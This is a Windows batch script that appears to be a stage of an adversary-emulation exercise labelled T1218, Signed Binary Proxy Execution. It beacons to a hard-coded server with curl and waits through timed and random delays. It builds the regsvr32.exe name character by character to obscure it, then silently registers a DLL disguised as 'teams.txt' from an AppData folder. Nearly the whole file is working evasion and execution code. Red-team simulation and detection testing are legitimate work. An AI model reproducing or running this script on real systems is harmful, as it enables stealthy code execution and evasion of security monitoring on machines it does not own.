@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET yktnwwf=%APPDATA%\8922\6da1d53e
SET fpakbq=Macula-Stage0-8922
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8922-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=teams.txt
SET fpldhe=8922

SET logf=%APPDATA%\!yydue!\macula-simulations.log
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: init_script_start=!fpldhe!>> "!logf!" 2>nul

timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_1_complete>> "!logf!" 2>nul

SET hb_res=1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>> "!logf!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
if !errorlevel! neq 0 SET hb_res=0
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_result=!hb_res!>> "!logf!" 2>nul
SET /A del=%RANDOM% %% 15 + 5
ping -n !del! 127.0.0.1 >nul

SET c1=R
SET c2=e
SET c3=g
SET c4=s
SET c5=v
SET c6=r
SET c7=3
SET c8=2
SET lolbin=%windir%\system32\%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%.exe
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: built_lolbin=!lolbin!>> "!logf!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_target=!yktnwwf!>> "!logf!" 2>nul
cd /d "!yktnwwf!" 2>nul
if !errorlevel! neq 0 goto ttp_fail

SET s1=/
SET s2=s
SET arg=!s1!!s2!
SET dllfile=!edjwtl!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: exec_cmd=!lolbin! !arg! !dllfile!>> "!logf!" 2>nul
!lolbin! !arg! "!dllfile!"
if !errorlevel! neq 0 goto ttp_fail

SET ttp_res=1
SET errd=
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_complete=!ttp_res!>> "!logf!" 2>nul
goto log_ttp

:ttp_fail
SET ttp_res=0
SET errd=exec_failed
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_failed=!errd!>> "!logf!" 2>nul

:log_ttp
SET ts=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,3!
echo [!ts!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_res!:!errd!>> "!logf!" 2>nul
timeout /t 7 /nobreak >nul
ENDLOCAL